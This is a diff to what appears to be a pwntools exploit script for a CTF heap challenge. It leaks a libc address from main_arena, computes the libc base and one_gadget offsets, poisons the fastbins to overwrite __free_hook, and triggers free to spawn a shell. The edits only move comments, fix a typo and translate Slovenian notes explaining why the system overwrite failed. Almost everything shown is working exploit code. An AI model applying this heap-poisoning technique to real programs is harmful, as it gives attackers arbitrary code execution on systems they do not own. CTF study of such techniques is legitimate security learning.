@@ -78,8 +78,7 @@ print_chunk(b"7")
 
 p.recvuntil(b"AAAAAAAA")
 leak = u64(p.recvline().strip().ljust(8, b"\x00"))
-log.info(f"Leak: {hex(leak)}")
-# ^ this leak is from main_arena + 592
+log.info(f"Leak: {hex(leak)}")              # this leak is from main_arena + 592
 
 # calc libc base           
 # vmmap yields libc base at runtime: 0x7efdcc865000
@@ -99,6 +98,9 @@ system = libc_base + system_offset
 log.info(f"system: {hex(system)}")
 
 # one_gadgets
+# 0x4f2a5       rsp & 0xf = 0, rcx = null
+# 0x4f302       rsp + 0x40 = null
+# 0x10a2fc      rsp + 0x70 = null
 one_gadget_1 = libc_base + 0x4f2a5
 one_gadget_2 = libc_base + 0x4f302
 one_gadget_3 = libc_base + 0x10a2fc
@@ -134,7 +136,7 @@ free(b"7")
 
 # empty tcache
 for _ in range(7):
-    malloc(b"0", b"20", b"/bin/sh")         # /bin/sh string here for ovrride with system method, no need for it when going with one gadgets
+    malloc(b"0", b"20", b"/bin/sh")         # /bin/sh string here for override with system method, no need for it when going with one gadgets
 
 # empty and poison fastbins
 malloc(b"1", b"20", p64(__free_hook))           # setup fake pointer in the bins
@@ -143,16 +145,11 @@ malloc(b"1", b"20", b"h")
 #malloc(b"1", b"20", p64(system))                # content of fake chunk at __free_hook
 malloc(b"1", b"20", p64(one_gadget_2))
 
-# SEGFAULT ker je zadnji bajt system addressa 0x20 (presledek). Ko je payload poslan, so bajti naslova v obratnem vrstnem redu (p64)
-# Torej ko tokenizer shella vidi 0x20 na vhodu, rece "oh, presledek, tebe bomo zamenjali z nullbytom in te bomo skippali :)
+# turns out that we cant override __free_hook with system, because system address' last byte is 0x20 (' ')
+# which means that tokenizer skips it when tokenizing the input.
+# Therefore it only puts 7 bytes onto __free_hook which results in a segfault
 
 # ~~call free so that __free_hook triggers aka shell spawns~~
 free(b"0")
 
 p.interactive()
-
-
-# one gadgets:
-# 0x4f2a5       rsp & 0xf = 0, rcx = null
-# 0x4f302       rsp + 0x40 = null
-# 0x10a2fc      rsp + 0x70 = null
